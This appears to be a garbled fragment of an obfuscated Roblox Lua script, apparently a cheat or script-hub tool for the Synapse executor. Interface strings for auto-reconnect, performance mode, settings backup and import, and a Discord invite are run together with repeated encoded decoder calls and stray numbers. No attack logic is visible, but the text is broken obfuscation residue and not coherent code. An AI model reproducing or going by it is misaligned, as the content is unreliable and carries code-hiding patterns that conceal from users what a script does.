stopped.dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)40v_ejssckzydec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)41Sounddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)42rbxassetid://dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)43v_bmvmdtpadec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)44Now playing: dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)45Auto Reconnectdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)46Reconnectdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)47Teleport failed, attempting reconnect...dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)48TeleportServicedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)49v_cuogiepidec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)50Performance Modedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)51v_eransewsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)52v_eransewsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)53v_eransewsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)54ParticleEmitterdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)55Traildec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)56Beamdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)57Decaldec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)58Texturedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)59SpotLightdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)60SurfaceLightdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)61PointLightdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)62Decaldec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)63Texturedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)64Performancedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)65Performance mode and night mode enableddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)66v_eransewsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)67v_eransewsdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)68Decaldec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)69Texturedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)70Performancedec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)71Performance mode disableddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)72Join Discorddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)73https://discord.com/invite/J7AYrApFAHdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)74Discorddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)75Discord invite copied to clipboard!dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)76Discorddec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)77Failed to copy invite. Please visit: dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)78Clipboard v_xsqkaegm: dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)792.0dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)80ScriptSettings_dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)81.jsondec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)82ScriptSettings_dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)83_backupdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)84.jsondec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)85Unknowndec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)86Unknowndec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)87v_qxtygwvgdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)88v_qxtygwvg saved successfully (Backup #dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)89)dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)90v_qxtygwvgdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)91v_qxtygwvg saved (Synapse)dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)92v_qxtygwvgdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)93v_qxtygwvg saved to clipboard (no file system)dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)94v_qxtygwvgdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)95No save method availabledec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)96v_qxtygwvgdec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)97Failed to save: dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)98Save v_xsqkaegm: dec__otdea("bGJFO1ZXQXVVV11/VUtgeUN1WjxCS151QnVOdUFOMjI=", 15)99v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)00Loaded from backup #dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)01v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)02Using default settingsdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)03tabledec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)04booleandec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)05v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)06v_qxtygwvg loaded successfullydec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)07v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)08Failed to load: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)09Load v_xsqkaegm: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)10Save v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)11Load v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)12Auto Savedec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)13Auto Savedec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)14Auto save enabled (every 5 minutes)dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)15Auto Savedec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)16Auto save disableddec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)17Restore from Backupdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)18%Y-%m-%d %H:%M:%Sdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)19Backupdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)20No backups founddec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)21Backupdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)22Restored from backup: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)23Backupdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)24Failed to restore: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)25Reset Everythingdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)26Resetdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)27Click again within 5 seconds to confirm COMPLETE RESETdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)28Resetdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)29Reset cancelleddec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)30RBXScriptConnectiondec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)31v_youefgutdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)32Resetdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)33Everything reset successfully (backup created)dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)34Resetdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)35Reset failed: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)36Reset v_xsqkaegm: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)37Export v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)38%Y-%m-%d %H:%M:%Sdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)39Exportdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)40v_qxtygwvg exported to clipboarddec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)41Export_dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)42%Y%m%d_%H%M%Sdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)43.jsondec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)44Exportdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)45v_qxtygwvg exported to: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)46Exportdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)47No export method availabledec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)48Exportdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)49Export failed: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)50Export v_xsqkaegm: dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)51Import v_qxtygwvgdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)52dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)53Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)54Clipboard access not availabledec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)55dec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)56Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)57Clipboard is emptydec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)58tabledec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)59Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)60Invalid settings formatdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)61Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)62v_odaqyexq mismatch - attempting migrationdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)63Importdec_fmpxce("DSQ+XA8kIVogFVUVNTQPGTZeAFwNJDoFCDQiAA8BIhoOAj4ADgI9GTVeVRggXj4ECF4AByA0IgYPAQAbCCQhGggAVRoPXlUZCTQEFQ0vXSENOyYWIF5dBA07WBo2KwAWNV5VFTYvORUhKxQcNQVZXAkkPVE=", 108)64Importing settings from: 